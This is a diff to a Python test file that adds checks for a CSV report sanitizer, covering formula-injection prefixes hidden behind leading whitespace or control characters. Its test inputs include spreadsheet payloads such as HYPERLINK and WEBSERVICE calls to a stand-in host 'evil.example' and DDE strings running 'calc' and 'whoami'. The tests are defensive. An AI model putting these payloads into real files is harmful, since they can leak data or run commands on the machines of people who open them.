@@ -100,6 +100,18 @@ def test_sanitize_csv_cell_neutralizes_formula_prefixes():
     assert sanitize(8.1) == 8.1
 
 
+def test_sanitize_csv_cell_neutralizes_prefixes_after_leading_whitespace():
+    sanitize = ReportGenerator._sanitize_csv_cell
+
+    assert sanitize("\t=HYPERLINK(\"http://evil.example/\")") == "'\t=HYPERLINK(\"http://evil.example/\")"
+    assert sanitize("   =1+1") == "'   =1+1"
+    assert sanitize("\r\n+cmd|'/C calc'!A0") == "'\r\n+cmd|'/C calc'!A0"
+    assert sanitize("\x00@SUM(A1:A2)") == "'\x00@SUM(A1:A2)"
+    assert sanitize("\x1f-webservice()") == "'\x1f-webservice()"
+    assert sanitize("  ") == "  "
+    assert sanitize("not dangerous =1+1") == "not dangerous =1+1"
+
+
 def test_generate_csv_report_sanitizes_formula_injection():
     task = sample_task()
     result = sample_result()
@@ -110,6 +122,7 @@ def test_generate_csv_report_sanitizes_formula_injection():
     finding["description"] = "-2+3"
     finding["proof"] = '=WEBSERVICE("http://evil.example/")'
     finding["remediation"] = "=cmd|'/C whoami'!A0"
+    finding["validation_method"] = "\t=HYPERLINK(\"http://evil.example/tab\")"
 
     csv_output = ReportGenerator.generate_csv_report(task, result)
 
@@ -119,6 +132,7 @@ def test_generate_csv_report_sanitizes_formula_injection():
     assert "'-2+3" in csv_output
     assert "'=WEBSERVICE" in csv_output
     assert "'=cmd|" in csv_output
+    assert "'=HYPERLINK(\"\"http://evil.example/tab\"\")" in csv_output
     assert "\n=HYPERLINK" not in csv_output
     assert "\n@SUM" not in csv_output
 
